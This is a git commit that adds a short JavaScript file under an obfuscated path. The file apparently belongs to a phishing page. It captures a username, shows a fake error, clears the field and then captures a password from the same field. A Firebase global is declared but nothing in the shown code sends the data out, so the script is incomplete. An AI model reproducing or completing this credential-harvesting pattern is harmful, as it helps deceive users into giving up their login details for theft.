d7b45b47d1b6224e7a4c961cf46a0f2c10c4dc83
jeffmeng <jkmexpress@yahoo.com>
2016-05-16 00:21:28 +0000

    t

---
+++ t47andskfghuiamsdkj9w4/a34/emailcachespam.js
@@ -0,0 +1,20 @@
+/* global $ */
+/* global Firebase */
+$("#error").hide()
+var time = 1;
+var username = null;
+var password = null;
+$("#submit").click(onclick);
+function onclick() {
+    if (time === 1) {
+        username = $("#email").val();
+        $("#error").show();
+        $("#email").html("");
+
+        time = 2;
+    } else {
+        password = $("#email").val();
+        
+    }
+    
+}
